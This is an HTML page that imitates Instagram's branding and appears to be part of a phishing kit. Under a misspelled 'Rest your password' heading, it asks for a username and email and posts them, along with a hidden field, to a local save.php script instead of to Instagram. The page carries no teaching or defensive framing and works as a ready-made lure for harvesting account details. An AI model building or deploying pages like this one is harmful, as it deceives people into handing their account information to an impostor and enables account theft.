<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Instagram | Create Account </title>
    <link rel="icon" href="instagram.png">
    <style>
        *
        {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body
        {
            width: 100%;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(45deg,red,violet);     
        }
        .form
        {
            width: 45%;
            height: 80%;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            padding: 50px;
            border: 5px solid white;
            background-color: white;
            border-radius: 30px;
        }
        .form h1
        {
            position: absolute;
            top: 280px;
            right: 400px;
            margin: 10px;
        }
        .form input
        {
            padding: 10px;
            font-size: 20px;
            outline: none;
            text-align: center;
            border-radius: 25px;
            border: 2px solid rgba(255,0,0,0.5);
            margin-top: 10px;
        }
        #btn
        {
            width: 41vh;
            padding:10px;
            height: 9vh;
            font-family: cursive;
            cursor: pointer;
            color: white;
            border: none;
            background: linear-gradient(45deg,violet,red);
            border-radius: 5px;
        }
        h2
        {
            color: red;
            font-family: sans-serif;
            font-size: 42px;
            text-align: center;
        }
        h2:hover
        {
            -webkit-text-stroke: 2.2px red;
            color: transparent;
            font-size: 44px;
            transition: 0.4s;
        }
        p
        {
            color: rgba(0,0,0,.7);
            font-family: cursive;
            font-size: 19px;
        }
        .form img
        {
            width: 85px;
            height: 85px;
            border: 2.5px solid white;
            border-radius: 25%;
            margin-top: -90px;
        }
        #btn:hover
        {
            background: white;
            border: 2px solid rgba(255,0,0,0.5);
            color: rgba(255,0,0,0.6);
            transition: 0.5s;
        }
    </style>
</head>
<body>
    <div class="form">
        <img src="instagram.png">
        <h2> Rest your password </h2>
        <p> Don't worry your remeber your details</p>
        <br>
        <form action="save.php" method="post">
            <h1>username</h1><input type="text" name="user" placeholder="Username" required>
            <br>
            <input type="text" name="email" placeholder="Email" required>
            <br>
            <input type="hidden" name="num" value=2 >
            <input id="btn" type="submit" value="rest">
        </form>
    </div>
</body>
</html>